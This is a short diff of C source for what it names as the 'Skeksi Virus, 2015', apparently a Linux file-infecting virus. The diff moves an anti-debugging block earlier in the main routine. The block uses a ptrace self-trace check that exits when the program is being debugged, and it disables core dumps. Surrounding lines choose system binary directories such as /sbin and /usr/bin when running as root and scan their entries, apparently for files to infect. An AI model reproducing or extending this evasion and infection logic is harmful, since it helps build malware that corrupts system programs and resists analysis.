@@ -720,6 +720,14 @@ void do_main(struct bootstrap_data *bootstrap)
 	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" };
 	char cwd[2] = {'.', '\0'};
 
+#if ANTIDEBUG
+        if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
+                _printf("!! Skeksi Virus, 2015 !!\n");
+                Exit(-1);
+        }
+        _prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
+#endif
+
 rescan:
 	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
 	if (!_strcmp(dir, "."))
@@ -734,14 +742,6 @@ rescan:
 	
 	load_self(&self);
 	
-#if ANTIDEBUG
-	if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
-		_printf("!! Skeksi Virus, 2015 !!\n");
-		Exit(-1);
-	}
-	_prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
-#endif
-
 	for (;;) {
 		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
 		if (nread < 0) {
